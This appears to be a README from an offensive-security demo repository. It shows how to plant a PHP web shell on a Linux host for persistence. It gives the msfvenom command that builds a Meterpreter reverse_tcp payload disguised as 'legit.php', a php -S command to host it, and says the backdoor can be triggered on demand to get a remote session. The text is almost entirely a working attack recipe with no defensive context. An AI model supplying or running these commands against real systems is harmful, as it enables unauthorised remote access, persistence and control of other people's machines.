# LINUX PERSISTENCE VIA WEB SHELL BACKDOOR

This demo illustrates the process of creating a PHP backdoor using msfvenom, setting up a web server to host the backdoor, and establishing persistence by triggering the backdoor on demand.  
This technique allows for remote access via Metasploit's Meterpreter session.  


## Instructions

Create the php backdoor with [*msfvenom*](https://www.offsec.com/metasploit-unleashed/msfvenom/):  
```sh
msfvenom -p php/meterpreter/reverse_tcp LHOST=<YOUR-ADDRESS> LPORT=4444 -f raw -o legit.php
```  

Spin up a php web dev server to expose the backdoor:  
```sh
php -S <YOUR-ADDRESS>:80
```  

Now you can trigger that backdoor "on-demand" and obtain a session on the compromised linux host.  
Follwoing is a brief video depicting the full process:  





https://github.com/R3DRUN3/sploitcraft/assets/102741679/02a5cf1d-02c7-4253-9541-4966584db20a

